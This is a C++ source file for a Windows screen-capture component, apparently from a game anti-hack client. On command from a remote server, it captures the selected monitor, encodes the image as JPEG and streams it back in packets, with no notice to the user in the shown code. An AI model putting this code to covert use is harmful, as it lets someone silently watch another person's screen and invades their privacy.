#include "stdafx.h"
#include "ScreenCapture.h"

#include <Gdiplus.h>
#include "Connection.h"
#include "HackServerProtocol.h"
#include "Log.h"
#include "ScreenShot.h"
#include "Util.h"
using namespace Gdiplus;
#pragma comment(lib, "gdiplus.lib")

CScreenCapture gScreenCapture;

CScreenCapture::CScreenCapture()
{
	this->State = 0;
	this->m_Quality = 100;
	this->monitor_index = 0;
}

CScreenCapture::~CScreenCapture()
{
	
}

// get image encoder CLSID by its name
int CScreenCapture::get_encoder_clsid(WCHAR *format, CLSID *pClsid) 
{
    unsigned int num = 0,  size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
    if (pImageCodecInfo == nullptr) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (unsigned int j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }    
    }
    free(pImageCodecInfo);
    return -1;
}

#define MAIN_WINDOW 0x00E8C578

bool CScreenCapture::getDesktopScreenShot(std::vector<unsigned char> & buffer, ULONG Quality)
{
	//RECT r;
    HWND hMyWnd = GetDesktopWindow();//*(HWND*)(MAIN_WINDOW);//GetDesktopWindow();
    //GetWindowRect(hMyWnd, &r);
    HDC dc = GetWindowDC(hMyWnd);
	//HDC dc = CreateDC("DISPLAY", NULL, NULL, NULL);
    //int w = r.right - r.left;
    //int h = r.bottom - r.top;
	int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
	int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
	int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int nBPP = GetDeviceCaps(dc, BITSPIXEL);
    HDC hdcCapture = CreateCompatibleDC(dc);
 
    // create the buffer for the screenshot
    BITMAPINFO bmiCapture = {
        sizeof(BITMAPINFOHEADER), w, -h, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0,
    };
 
    // create a container and take the screenshot
    LPBYTE lpCapture;
    HBITMAP hbmCapture = CreateDIBSection(dc, &bmiCapture,
        DIB_PAL_COLORS, (LPVOID *)&lpCapture, nullptr, 0);
 
    // failed to take it
    if (!hbmCapture) {
        DeleteDC(hdcCapture);
        DeleteDC(dc);
        return false;
    }
 
    // copy the screenshot buffer
    int nCapture = SaveDC(hdcCapture);
    SelectObject(hdcCapture, hbmCapture);
    BitBlt(hdcCapture, 0, 0, w, h, dc, x, y, SRCCOPY);
	//StretchBlt(hdcCapture, 0, 0, w, h, dc, x, y, w, h, SRCCOPY);
    RestoreDC(hdcCapture, nCapture);
    DeleteDC(hdcCapture);
    DeleteDC(dc);
 
    // create Gdiplus::Bitmap object
    Bitmap *pScreenShot = new Bitmap(hbmCapture, (HPALETTE)nullptr);

	/*float horizontalScalingFactor = (float) 800 / (float) pScreenShot->GetWidth();
	float verticalScalingFactor = (float) 600 / (float) pScreenShot->GetHeight();

	float newWidth = horizontalScalingFactor * (float) pScreenShot->GetWidth();
	float newHeight = verticalScalingFactor * (float) pScreenShot->GetHeight();

	Image* new_screenshot = new Bitmap((int) newWidth, (int) newHeight);

	Graphics g(new_screenshot);

	g.ScaleTransform(horizontalScalingFactor, verticalScalingFactor);
	g.DrawImage(pScreenShot, 0, 0);
	*/
	//gLog.Output(LOG_DEBUG,"Width = %d Height = %d (%d - %d)",pScreenShot->GetWidth(),pScreenShot->GetHeight());
	//printf("Width = %d Height = %d",pScreenShot->GetWidth(),pScreenShot->GetHeight());
	
    //encoding params
    ULONG quality = Quality;
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid  = EncoderQuality;
    encoderParams.Parameter[0].Type  = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;
    CLSID imageCLSID;
    get_encoder_clsid(L"image/jpeg", &imageCLSID);
 
    // create empty stream
    IStream* pIStream = nullptr;
    bool ok = (CreateStreamOnHGlobal(nullptr, TRUE, (LPSTREAM*)&pIStream) == S_OK);
    if (ok) {
        // save imaget into it
        ok = (pScreenShot->Save(pIStream, &imageCLSID, &encoderParams) == Ok);
        if (ok) {
            // get the size of the stream
            ULARGE_INTEGER ulnSize;
            LARGE_INTEGER lnOffset;
            ULONG ulBytesRead = 0;
            lnOffset.QuadPart = 0;
            ok = (pIStream->Seek(lnOffset, STREAM_SEEK_END, &ulnSize) == S_OK);
            if (ok) {
                // now move the pointer to the beginning of the file
                ok = (pIStream->Seek(lnOffset, STREAM_SEEK_SET, nullptr) == S_OK);
                if (ok) {
                    buffer.resize(ulnSize.QuadPart);
                    ok = (pIStream->Read(buffer.data(), buffer.size(), &ulBytesRead) == S_OK);
                }
            }
            pIStream->Release();
        }
    }
    
    delete pScreenShot;
    DeleteObject(hbmCapture);
 
    return true;
}

int screen_counter;

#define FLAG_IS_SET(Value,  Flag) (Value & Flag)
#define FLAG_NOT_SET(Value, Flag) (!(Value & Flag))

//BOOL ObtainMonitors()
//{
//  DWORD i = 0;
//  DWORD j;
//  DISPLAY_DEVICE dc;
//  
//  dc.cb = sizeof(dc);
//
//  while(EnumDisplayDevices(NULL, i, &dc, EDD_GET_DEVICE_INTERFACE_NAME) != 0)
//  {
//    if ((dc.StateFlags & DISPLAY_DEVICE_ACTIVE) && !(dc.StateFlags & DISPLAY_DEVICE_MIRRORING_DRIVER))
//    {
//      DEVMODE dm;
//
//      j = 0;
//      while(EnumDisplaySettings(dc.DeviceName, j, &dm) != 0)
//      {
//      	dm.
//        //Запоминаем DEVMODE dm, чтобы потом мы могли его найти и использовать
//        //в ChangeDisplaySettings, когда будем инициализировать окно
//        ++j;
//      }
//    }
//    ++i;
//  }
//
//  if (i == 0)
//    return 0;
//
//  return 1;
//}

BOOL CALLBACK MonitorEnumProcCallback(_In_  HMONITOR hMonitor, _In_  HDC DevC, _In_  LPRECT lprc_monitor, _In_  LPARAM dwData)
{
	screen_counter++;

	//std::vector<unsigned char> buffer = static_cast<std::vector<unsigned char>>(dwData);
	
	if(screen_counter != gScreenCapture.monitor_index)
		return true;
	
	MONITORINFO  info;
    info.cbSize = sizeof(MONITORINFO);

    BOOL monitorInfo = GetMonitorInfo(hMonitor, &info);

    if (monitorInfo) 
	{
        int Width = GetDeviceCaps(DevC, DESKTOPHORZRES);
        int Height = GetDeviceCaps(DevC, DESKTOPVERTRES);

    	int nBPP = GetDeviceCaps(DevC, BITSPIXEL);
	    HDC hdcCapture = CreateCompatibleDC(DevC);
	 
	    // create the buffer for the screenshot
	    BITMAPINFO bmiCapture = {
	        sizeof(BITMAPINFOHEADER), Width, -Height, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0,
	    };
	 
	    // create a container and take the screenshot
	    LPBYTE lpCapture;
	    HBITMAP hbmCapture = CreateDIBSection(DevC, &bmiCapture,
	        DIB_PAL_COLORS, (LPVOID *)&lpCapture, nullptr, 0);
	 
	    // failed to take it
	    if (!hbmCapture) {
	        DeleteDC(hdcCapture);
	        DeleteDC(DevC);
	        return false;
	    }
	 
	    // copy the screenshot buffer
	    int nCapture = SaveDC(hdcCapture);
	    SelectObject(hdcCapture, hbmCapture);
	    BitBlt(hdcCapture, 0, 0, Width, Height, DevC, info.rcMonitor.left, info.rcMonitor.top, SRCCOPY | CAPTUREBLT);
		//StretchBlt(hdcCapture, 0, 0, Width, Height, DevC, info.rcMonitor.left, info.rcMonitor.top, 1920, 1080, SRCCOPY);
	    RestoreDC(hdcCapture, nCapture);
	    DeleteDC(hdcCapture);
	    DeleteDC(DevC);
	 
	    // create Gdiplus::Bitmap object
	    Bitmap *pScreenShot = new Bitmap(hbmCapture, (HPALETTE)nullptr);

    	//Scaling
		/*float horizontalScalingFactor = (float) 800 / (float) pScreenShot->GetWidth();
		float verticalScalingFactor = (float) 600 / (float) pScreenShot->GetHeight();

		float newWidth = horizontalScalingFactor * (float) pScreenShot->GetWidth();
		float newHeight = verticalScalingFactor * (float) pScreenShot->GetHeight();

		Image* new_screenshot = new Bitmap((int) newWidth, (int) newHeight);

		Graphics g(new_screenshot);

		g.ScaleTransform(horizontalScalingFactor, verticalScalingFactor);
		g.DrawImage(pScreenShot, 0, 0);*/
		
		//gLog.Output(LOG_DEBUG,"Width = %d Height = %d (%d - %d)",pScreenShot->GetWidth(),pScreenShot->GetHeight());
		//printf("Width = %d Height = %d",pScreenShot->GetWidth(),pScreenShot->GetHeight());
		
	    //encoding params
	    ULONG quality = gScreenCapture.m_Quality;
	    EncoderParameters encoderParams;
	    encoderParams.Count = 1;
	    encoderParams.Parameter[0].NumberOfValues = 1;
	    encoderParams.Parameter[0].Guid  = EncoderQuality;
	    encoderParams.Parameter[0].Type  = EncoderParameterValueTypeLong;
	    encoderParams.Parameter[0].Value = &quality;
	    CLSID imageCLSID;
	    gScreenCapture.get_encoder_clsid(L"image/jpeg", &imageCLSID);
	 
	    // create empty stream
	    IStream* pIStream = nullptr;
	    bool ok = (CreateStreamOnHGlobal(nullptr, TRUE, (LPSTREAM*)&pIStream) == S_OK);
	    if (ok) {
	        // save imaget into it
	        ok = (pScreenShot->Save(pIStream, &imageCLSID, &encoderParams) == Ok);
	        if (ok) {
	            // get the size of the stream
	            ULARGE_INTEGER ulnSize;
	            LARGE_INTEGER lnOffset;
	            ULONG ulBytesRead = 0;
	            lnOffset.QuadPart = 0;
	            ok = (pIStream->Seek(lnOffset, STREAM_SEEK_END, &ulnSize) == S_OK);
	            if (ok) {
	                // now move the pointer to the beginning of the file
	                ok = (pIStream->Seek(lnOffset, STREAM_SEEK_SET, nullptr) == S_OK);
	                if (ok) {
	                    gScreenCapture.screen_buffer.resize(ulnSize.QuadPart);
	                    ok = (pIStream->Read(gScreenCapture.screen_buffer.data(), gScreenCapture.screen_buffer.size(), &ulBytesRead) == S_OK);
	                }
	            }
	            pIStream->Release();
	        }
	    }
	    
	    delete pScreenShot;
	    DeleteObject(hbmCapture);
	}


	
	return TRUE;
}

//bool CScreenCapture::getDesktopScreenShot(std::vector<unsigned char> & buffer, ULONG Quality)
//{
//    //RECT r;
//    //HWND hMyWnd = GetDesktopWindow();//*(HWND*)(MAIN_WINDOW);//GetDesktopWindow();
//    //GetWindowRect(hMyWnd, &r);
//    //HDC dc = GetWindowDC(hMyWnd);
//    //int w = r.right - r.left;
//    //int h = r.bottom - r.top;
//    //int nBPP = GetDeviceCaps(dc, BITSPIXEL);
//    //HDC hdcCapture = CreateCompatibleDC(dc);
// 
//    //// create the buffer for the screenshot
//    //BITMAPINFO bmiCapture = {
//    //    sizeof(BITMAPINFOHEADER), w, -h, 1, nBPP, BI_RGB, 0, 0, 0, 0, 0,
//    //};
// 
//    //// create a container and take the screenshot
//    //LPBYTE lpCapture;
//    //HBITMAP hbmCapture = CreateDIBSection(dc, &bmiCapture,
//    //    DIB_PAL_COLORS, (LPVOID *)&lpCapture, NULL, 0);
// 
//    //// failed to take it
//    //if (!hbmCapture) {
//    //    DeleteDC(hdcCapture);
//    //    DeleteDC(dc);
//    //    return false;
//    //}
// 
//    //// copy the screenshot buffer
//    //int nCapture = SaveDC(hdcCapture);
//    //SelectObject(hdcCapture, hbmCapture);
//    //BitBlt(hdcCapture, 0, 0, w, h, dc, 0, 0, SRCCOPY);
//    //RestoreDC(hdcCapture, nCapture);
//    //DeleteDC(hdcCapture);
//    //DeleteDC(dc);
//
//	int x1, y1, x2, y2/*, w, h*/;
//
//    // get screen dimensions
//    x1  = GetSystemMetrics(SM_XVIRTUALSCREEN);
//    y1  = GetSystemMetrics(SM_YVIRTUALSCREEN);
//    x2  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
//    y2  = GetSystemMetrics(SM_CYVIRTUALSCREEN);
//    //w   = x2 - x1;
//   // h   = y2 - y1;
//
//
//	RECT r;
//	HWND hMyWnd = GetDesktopWindow();//*(HWND*)(MAIN_WINDOW);//GetDesktopWindow();
//	GetWindowRect(hMyWnd, &r);
//	//HDC dc = GetWindowDC(hMyWnd);
//	int w = r.right - r.left;
//	int h = r.bottom - r.top;
//
//    // copy screen to bitmap
//    HDC     hScreen = GetDC(NULL);
//    HDC     hDC     = CreateCompatibleDC(hScreen);
//    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
//    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
//    BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
// 
//    // create Gdiplus::Bitmap object
//    Bitmap *pScreenShot = new Bitmap(hBitmap, (HPALETTE)NULL);
//
//
//	
//	SelectObject(hDC, old_obj);
//    DeleteDC(hDC);
//    ReleaseDC(NULL, hScreen);
//    DeleteObject(hBitmap);
//
//	//CaptureAnImage(GetDesktopWindow());
//	
//	gLog.Output(LOG_DEBUG,"X1:%d X2: %d Y1: %d Y2: %d w: %d h: %d",x1,x2,y1,y2,w,h);
// 
//
//	/*IStream *stream = NULL;
//    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
//    if( !SUCCEEDED(hr) )
//        return false;
//
//	CLSID imageCLSID;
//	GetEncoderClsid(L"image/jpeg", &imageCLSID);
//
//    pScreenShot->Save(stream, &imageCLSID, 0);
//    ULARGE_INTEGER liSize;
//    IStream_Size(stream, &liSize);
//    DWORD len = liSize.LowPart;
//    IStream_Reset(stream);
//    buffer.resize(len);
//    IStream_Read(stream, &buffer[0], len);
//    stream->Release();*/
//
//    //encoding params
//    ULONG quality = Quality;
//    EncoderParameters encoderParams;
//    encoderParams.Count = 1;
//    encoderParams.Parameter[0].NumberOfValues = 1;
//    encoderParams.Parameter[0].Guid  = EncoderQuality;
//    encoderParams.Parameter[0].Type  = EncoderParameterValueTypeLong;
//    encoderParams.Parameter[0].Value = &quality;
//    CLSID imageCLSID;
//    if (GetEncoderClsid(L"image/jpeg", &imageCLSID) == -1)
//    {
//	    return false;
//    }
//
//	/*char text[100];
//	sprintf(text,"W = %d H = %d",pScreenShot->GetWidth(),pScreenShot->GetHeight());
//	MessageBox(0,text,0,0);*/
//	
//    // create empty stream
//    IStream* pIStream = NULL;
//    bool ok = (CreateStreamOnHGlobal(NULL, TRUE, (LPSTREAM*)&pIStream) == S_OK);
//    if (ok) {
//        // save imaget into it
//        ok = (pScreenShot->Save(pIStream, &imageCLSID, &encoderParams) == Ok);
//        if (ok) {
//            // get the size of the stream
//            ULARGE_INTEGER ulnSize;
//            LARGE_INTEGER lnOffset;
//            ULONG ulBytesRead = 0;
//            lnOffset.QuadPart = 0;
//            ok = (pIStream->Seek(lnOffset, STREAM_SEEK_END, &ulnSize) == S_OK);
//            if (ok) {
//                // now move the pointer to the beginning of the file
//                ok = (pIStream->Seek(lnOffset, STREAM_SEEK_SET, NULL) == S_OK);
//                if (ok) {
//                    buffer.resize(ulnSize.QuadPart);
//                    ok = (pIStream->Read(buffer.data(), buffer.size(), &ulBytesRead) == S_OK);
//                }
//            }
//            pIStream->Release();
//        }
//    }
//    
//    delete pScreenShot;
//   // DeleteObject(hbmCapture);
// 
//    return true;
//}

void CScreenCapture::CaptureScreen()
{
	//if (gScreenShot.delay + 600000 >= GetTickCount())
	if (GetTickCount() - gScreenShot.delay >= 600000)
	{
		//MessageBox(0,"kek",0,0);
		gScreenShot.delay = GetTickCount();
		//gScreenShot.SendScreenShot();
	}
	//return;
	if (this->State == 0)
	{
		return;
	}

	ULONG_PTR gdiplus_token;
	GdiplusStartupInput gdiplus_startup_input;
	GdiplusStartup(&gdiplus_token, &gdiplus_startup_input, nullptr);

	// make screenshot
	//std::vector<unsigned char> buffer;
	screen_buffer.clear();

	screen_counter = -1;
	
	HDC DevC = GetDC(nullptr);
	BOOL value = EnumDisplayMonitors(DevC, nullptr, MonitorEnumProcCallback, 0);

	

	if (!value || screen_buffer.empty()) {
		gLog.Output(LOG_DEBUG,"SOMETHING WENT WRONG. Terrible sorry...");
	} else {
		this->SendScreenShot(screen_buffer);
	}
	
	/*if (!this->getDesktopScreenShot(buffer,this->m_Quality) || buffer.empty()) {
		gLog.Output(LOG_DEBUG,"SOMETHING WENT WRONG. Terrible sorry...");
	} else {
		this->SendScreenShot(buffer);
	}*/

	GdiplusShutdown(gdiplus_token);
}

void CScreenCapture::SendScreenShot(std::vector<unsigned char> & buffer)
{
	/*UINT len = buffer.size();
	HGLOBAL hMem = GlobalAlloc(GMEM_FIXED, len);
	BYTE *pmem = (BYTE*)GlobalLock(hMem);
	memcpy(pmem, &buffer[0], len);
	IStream    *stream = NULL;
	CreateStreamOnHGlobal(hMem, FALSE, &stream);
	CImage image;
	image.Load(stream);
	stream->Release();
	GlobalUnlock(hMem);
	GlobalFree(hMem);
	image.Save("image.jpg",ImageFormatJPEG);*/
	
	//gLog.Output(LOG_DEBUG,"Len: %d",len);

	//
	
	int SendIndex = 0;
	for(int i = 0; i < buffer.size();)
	{
		BYTE send[8192*2];
		//BYTE send[MAX_BUFF_SIZE/2];

		PMSG_SCREEN_SEND pMsg;

		pMsg.header.set(0x10,0);

		int size = sizeof(pMsg);

		pMsg.count = 0;
		pMsg.bufferSize = buffer.size();
		pMsg.index = SendIndex++;

		PMSG_SCREEN info;

		for(int j = 0; j < 8192*2-20; j ++)
		{
			if (i>=buffer.size())
			{
				break;
			}

			info.value = buffer[i];

			memcpy(&send[size],&info,sizeof(info));
			size += sizeof(info);

			pMsg.count++;
			i++;
		}

		pMsg.header.size[0] = SET_NUMBERHB(size);

		pMsg.header.size[1] = SET_NUMBERLB(size);

		memcpy(send,&pMsg,sizeof(pMsg));

		while(true)
		{
			if (gConnection.CheckSendSize() > 0)
			{
				Sleep(1);
			}
			else
			{
				break;
			}
		}

		gConnection.DataSend(send,size);
		//gLog.Output(LOG_DEBUG,"Size = %d!",size);
		//Sleep(3);
	}
}

BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData)
{
    int *Count = (int*)dwData;
    (*Count)++;
    return TRUE;
}

int MonitorCount()
{
    int Count = 0;
    if (EnumDisplayMonitors(nullptr, nullptr, MonitorEnumProc, (LPARAM)&Count))
        return Count;
    return -1;//signals an error
}

void CScreenCapture::RecvSetState(PMSG_SCREENSTATE_RECV* lpMsg)
{
	if (lpMsg->value == 1)
	{
		this->m_Quality = lpMsg->quality;

		this->monitor_index = lpMsg->display_index;

		this->server_screen_height = lpMsg->server_screen_height;
		this->server_screen_width = lpMsg->server_screen_width;

		if (lpMsg->quality == 100 && this->State != 1)
		{
			gDisplayCount = MonitorCount();

			if(gDisplayCount == -1)
			{
				SplashScreen(&SplashError,2,true,"Error...",5000);
				SafeExitProcess();
			}

			
			HDC hDCScreen =  GetDC(nullptr);
			int horres = GetDeviceCaps(hDCScreen,  HORZRES);
			int vertres = GetDeviceCaps(hDCScreen,  VERTRES);
			ReleaseDC(nullptr, hDCScreen);

			PMSG_SCREENDATA_SEND pMsg;

			pMsg.header.set(0x11,sizeof(pMsg));

			pMsg.Width = horres;
			pMsg.Height = vertres;
			pMsg.DisplayCount = gDisplayCount;

			gConnection.DataSend((BYTE*)&pMsg,pMsg.header.size);
		}
	}

	this->State = lpMsg->value;
}